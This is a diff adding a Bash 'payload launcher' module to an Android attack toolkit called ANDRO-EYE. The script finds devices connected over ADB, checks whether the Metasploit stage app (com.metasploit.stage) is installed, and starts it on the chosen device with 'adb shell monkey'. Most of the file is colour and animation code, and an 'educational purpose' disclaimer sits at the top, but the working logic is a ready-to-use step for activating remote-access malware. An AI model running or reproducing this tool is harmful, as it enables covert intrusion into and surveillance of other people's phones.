@@ -1,0 +1,323 @@
+#!/bin/bash
+# Written in Bash
+# "ONLY FOR EDUCATIONAL PURPOSE"
+# PAYLOAD LAUNCHER MODULE - ANDRO-EYE
+
+# Color codes
+RED='\033[0;91m'
+GREEN='\033[0;92m'
+YELLOW='\033[0;93m'
+BLUE='\033[0;94m'
+PURPLE='\033[0;95m'
+CYAN='\033[0;96m'
+WHITE='\033[0;97m'
+NC='\033[0m' # No Color
+BOLD='\033[1m'
+UNDERLINE='\033[4m'
+BLINK='\033[5m'
+
+# Animation functions
+loading_animation() {
+    local message=$1
+    local chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    
+    echo -ne "${CYAN}${BOLD}$message ${NC}"
+    for i in {1..15}; do
+        for char in $(echo $chars | grep -o .); do
+            echo -ne "${YELLOW}${BOLD}$char${NC}"
+            sleep 0.05
+            echo -ne "\b"
+        done
+    done
+    echo -e "${GREEN}${BOLD} Done! ${NC}"
+}
+
+progress_bar() {
+    local duration=$1
+    local message=$2
+    
+    echo -ne "${BLUE}${BOLD}$message ${NC}"
+    for i in {1..20}; do
+        echo -ne "${GREEN}${BOLD}▓${NC}"
+        sleep $(echo "scale=2; $duration/20" | bc 2>/dev/null || echo "0.05")
+    done
+    echo -e "${GREEN}${BOLD} Complete! ${NC}"
+}
+
+sparkle_effect() {
+    echo -ne "${YELLOW}"
+    for i in {1..15}; do
+        echo -ne "✦"
+        sleep 0.03
+    done
+    echo -e "${NC}"
+}
+
+pulse_message() {
+    local message=$1
+    local color=$2
+    
+    for i in {1..3}; do
+        echo -ne "${color}${BOLD}$message${NC}"
+        sleep 0.2
+        echo -ne "\r"
+        for j in $(seq 1 ${#message}); do
+            echo -n " "
+        done
+        echo -ne "\r"
+        sleep 0.2
+    done
+    echo -e "${color}${BOLD}$message${NC}"
+}
+
+typewriter_effect() {
+    local text=$1
+    local color=$2
+    for ((i=0; i<${#text}; i++)); do
+        echo -ne "${color}${BOLD}${text:$i:1}${NC}"
+        sleep 0.03
+    done
+    echo
+}
+
+# Function to display device in a box
+display_device_box() {
+    local number=$1
+    local device=$2
+    local model=$3
+    local status=$4
+    
+    echo -e "${YELLOW}${BOLD}┌──────────────────────────────────────────────┐${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}  ${GREEN}${BOLD}Device ${number}:${NC}                                        ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}      ${CYAN}ID:${NC} ${WHITE}$device${NC}              ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}      ${PURPLE}Model:${NC} ${WHITE}$model${NC}                                 ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}│${NC}      ${BLUE}Status:${NC} $status                           ${YELLOW}│${NC}"
+    echo -e "${YELLOW}${BOLD}└──────────────────────────────────────────────┘${NC}"
+}
+
+# Function to check if Metasploit package is installed
+check_package_installed() {
+    local device=$1
+    local package="com.metasploit.stage"
+    
+    # Check if package is installed
+    if adb -s "$device" shell pm list packages | grep -q "$package"; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Clear screen and show banner
+clear
+echo -e "${PURPLE}${BOLD}"
+cat << "EOF"
+    ╔══════════════════════════════════════════════════════════╗
+    ║  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗  ║
+    ║  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗ ║
+    ║  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║ ║
+    ║  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║ ║
+    ║  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝ ║
+    ║  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ║
+    ║                                                          ║
+    ║              🚀 ${GREEN}PAYLOAD LAUNCHER${PURPLE} - ${CYAN}Metasploit${PURPLE}                ║
+    ║                                                          ║
+    ╚══════════════════════════════════════════════════════════╝
+EOF
+echo -e "${NC}"
+sparkle_effect
+
+# Create .temp directory if it doesn't exist
+mkdir -p .temp 2>/dev/null
+
+## DEVICE ID EXTRACT ##
+echo -e "\n${BLUE}${BOLD}🔎 Scanning for connected devices...${NC}"
+loading_animation "Detecting devices"
+
+adb devices | sed -n '2,$p' | awk '{ print $1 }' > .temp/dev_list_temp 2>/dev/null
+
+# Check if adb command succeeded
+if [ $? -ne 0 ]; then
+    pulse_message "⚠️  ADB command failed! Is ADB installed?" "${RED}"
+    sleep 2
+    bash modules/function2.sh
+    exit 1
+fi
+
+# Read devices into array properly
+mapfile -t dev < .temp/dev_list_temp 2>/dev/null
+
+# Assign device variables with null checking
+dev_1="${dev[0]:-}"
+dev_2="${dev[1]:-}"
+dev_3="${dev[2]:-}"
+
+## DEVICE MODEL EXTRACT ##
+adb devices -l | grep "model:" > .temp/dev_list_model_temp 2>/dev/null
+
+# Extract models properly
+mod_1=""
+mod_2=""
+mod_3=""
+
+if [ -s ".temp/dev_list_model_temp" ]; then
+    mapfile -t model_lines < .temp/dev_list_model_temp
+    
+    for i in "${!model_lines[@]}"; do
+        model=$(echo "${model_lines[$i]}" | grep -o 'model:[^ ]*' | cut -d':' -f2)
+        
+        case $i in
+            0) mod_1="$model" ;;
+            1) mod_2="$model" ;;
+            2) mod_3="$model" ;;
+        esac
+    done
+fi
+
+# Fix: Proper device count logic
+total_dev=0
+[ -n "$dev_1" ] && total_dev=1
+[ -n "$dev_2" ] && total_dev=2
+[ -n "$dev_3" ] && total_dev=3
+
+# Display results
+echo -e "\n${GREEN}${BOLD}✅ Scan Complete!${NC}\n"
+
+# Function to launch payload
+launch_payload() {
+    local device=$1
+    local model=$2
+    local device_num=$3
+    
+    echo -e "\n${YELLOW}${BOLD}════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}${BOLD}🎯 Launching payload on:${NC}"
+    display_device_box "$device_num" "$device" "$model" "${GREEN}Selected${NC}"
+    
+    # Check if package is installed
+    echo -e "\n${BLUE}${BOLD}🔍 Checking if Metasploit package is installed...${NC}"
+    if check_package_installed "$device"; then
+        echo -e "${GREEN}${BOLD}✓ Metasploit package found${NC}"
+        
+        echo -e "\n${PURPLE}${BOLD}🚀 Launching payload...${NC}"
+        progress_bar 2 "Starting application"
+        
+        # Launch the payload
+        adb -s "$device" shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1
+        
+        if [ $? -eq 0 ]; then
+            echo -e "\n${GREEN}${BOLD}✅ Payload launched successfully!${NC}"
+            sparkle_effect
+        else
+            echo -e "\n${RED}${BOLD}❌ Failed to launch payload${NC}"
+        fi
+    else
+        echo -e "\n${RED}${BOLD}❌ Metasploit package not installed on this device!${NC}"
+        echo -e "${YELLOW}${BOLD}Please install the payload first using option 2${NC}"
+    fi
+}
+
+# Main logic
+if [ "$total_dev" -eq 0 ]; then
+    echo -e "${RED}${BOLD}┌──────────────────────────────────────────────┐${NC}"
+    echo -e "${RED}${BOLD}│${NC}  ${RED}${BLINK}⚠️${NC}  ${WHITE}NO DEVICE CONNECTED${NC}                       ${RED}${BOLD}│${NC}"
+    echo -e "${RED}${BOLD}│${NC}      ${CYAN}Please connect a device with USB debugging enabled${NC}   ${RED}${BOLD}│${NC}"
+    echo -e "${RED}${BOLD}└──────────────────────────────────────────────┘${NC}"
+    
+elif [ "$total_dev" -eq 1 ]; then
+    launch_payload "$dev_1" "${mod_1:-Unknown}" "1"
+    
+elif [ "$total_dev" -eq 2 ]; then
+    echo -e "\n${GREEN}${BOLD}📱 Multiple devices detected:${NC}\n"
+    
+    # Check package status for each device
+    for i in 1 2; do
+        device_var="dev_$i"
+        model_var="mod_$i"
+        device="${!device_var}"
+        model="${!model_var:-Unknown}"
+        
+        if check_package_installed "$device"; then
+            status="${GREEN}✓ Package installed${NC}"
+        else
+            status="${RED}✗ Package missing${NC}"
+        fi
+        
+        display_device_box "$i" "$device" "$model" "$status"
+        echo
+    done
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}🎯 Select device to launch payload (1-2) ${WHITE}➤ ${RED}"
+        read options
+        echo -ne "${NC}"
+        
+        case $options in
+            1)
+                launch_payload "$dev_1" "${mod_1:-Unknown}" "1"
+                break
+                ;;
+            2)
+                launch_payload "$dev_2" "${mod_2:-Unknown}" "2"
+                break
+                ;;
+            *)
+                pulse_message "❌ Invalid option! Choose 1 or 2" "${RED}"
+                ;;
+        esac
+    done
+    
+elif [ "$total_dev" -eq 3 ]; then
+    echo -e "\n${GREEN}${BOLD}📱 Multiple devices detected:${NC}\n"
+    
+    # Check package status for each device
+    for i in 1 2 3; do
+        device_var="dev_$i"
+        model_var="mod_$i"
+        device="${!device_var}"
+        model="${!model_var:-Unknown}"
+        
+        if check_package_installed "$device"; then
+            status="${GREEN}✓ Package installed${NC}"
+        else
+            status="${RED}✗ Package missing${NC}"
+        fi
+        
+        display_device_box "$i" "$device" "$model" "$status"
+        echo
+    done
+    
+    while true; do
+        echo -ne "\n${YELLOW}${BOLD}🎯 Select device to launch payload (1-3) ${WHITE}➤ ${RED}"
+        read options
+        echo -ne "${NC}"
+        
+        case $options in
+            1)
+                launch_payload "$dev_1" "${mod_1:-Unknown}" "1"
+                break
+                ;;
+            2)
+                launch_payload "$dev_2" "${mod_2:-Unknown}" "2"
+                break
+                ;;
+            3)
+                launch_payload "$dev_3" "${mod_3:-Unknown}" "3"
+                break
+                ;;
+            *)
+                pulse_message "❌ Invalid option! Choose 1-3" "${RED}"
+                ;;
+        esac
+    done
+fi
+
+# Clean up temp files
+rm -f .temp/dev_list_temp .temp/dev_list_model_temp 2>/dev/null
+
+# Return to menu with better prompt
+echo -e "\n${YELLOW}${BOLD}════════════════════════════════════════════════${NC}"
+echo -ne "${CYAN}${BOLD}Press Enter to return to main menu...${NC}"
+read
+
+clear
+bash modules/function2.sh
